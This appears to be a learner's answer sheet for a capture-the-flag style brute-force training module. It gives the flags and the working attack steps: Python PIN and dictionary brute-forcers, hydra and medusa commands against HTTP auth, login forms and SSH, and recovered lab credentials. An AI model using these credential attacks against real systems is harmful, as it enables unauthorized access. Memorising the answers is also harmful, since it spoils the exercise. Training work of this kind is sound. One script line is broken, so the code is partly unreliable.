# Brute Force Attacks

1. After successfully brute-forcing the PIN, what is the full flag the script returns?

Answer: HTB{Brut3_F0rc3_1s_P0w3rfu1}

Explanation: used a snippet given in the article

"""
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break

"""

# Dictionary Attacks

1.  After successfully brute-forcing the target using the script, what is the full flag the script returns?

Answer : HTB{Brut3_F0rc3_M4st3r}

Explanation: 

"""
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
"""

# Basic HTTP Authentication

1.  After successfully brute-forcing, and then logging into the target, what is the full flag you find?

Answer: HTB{th1s_1s_4_f4k3_fl4g}

Explanation: hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 83.136.250.52 http-get / -s 50631

# Login Forms

1. After successfully brute-forcing, and then logging into the target, what is the full flag you find?

Answer: HTB{W3b_L0gin_Brut3F0rc3}

Command:  hydra -L ./top-usernames-shortlist.txt  -P ./2023-200_most_used_passwords.txt -f 83.136.253.171 -s 46029 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

# Web Services

1. What was the password for the ftpuser?

Answer: qqww1122

Explanation: medusa -h 94.237.49.130 -n 41112  -u ftpuser -P 2020-200_most_used_passwords.txt  -t 5 -M ssh

2. After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt?

Answer: HTB{SSH_and_FTP_Bruteforce_Success}

Explanation: ssh ftpuser@94.237.49.130 -p 41112

# Custom wordlists

1. After successfully brute-forcing, and then logging into the target, what is the full flag you find?

Answer: HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}

Explanation: hydra -L jane_smith.txt  -P jane-filtered.txt 83.136.255.142 -s 57433 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"

# Skill Assessment 1


1. What is the password for the basic auth login?

Answer: Admin123

Explanation: Do not use wget command. Better to access the provided link to raw files from pwnbox and save raw file by the provided button. 

2.  After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?

Answer: sstwossh

Explanation: By using hydra command, related to the first question. This time: 
Useful links: 
1. https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication 
2. https://www.debugbear.com/basic-auth-header-generator

# Skill Assessment 2

1. What is the username of the ftp user you find via brute-forcing?

Answer: thomas

Explanation: ise username-anarchy to create the list of possible usernames with Thomas Smith (user from IncidentReport.txt). Simple Enumeration.

2. What is the flag contained within flag.txt

Answer: HTB{brut3f0rc1ng_succ3ssful}

Hydra command: hydra -L tom_smith.txt -P passwords.txt -f 94.237.54.69 -s 55547 ssh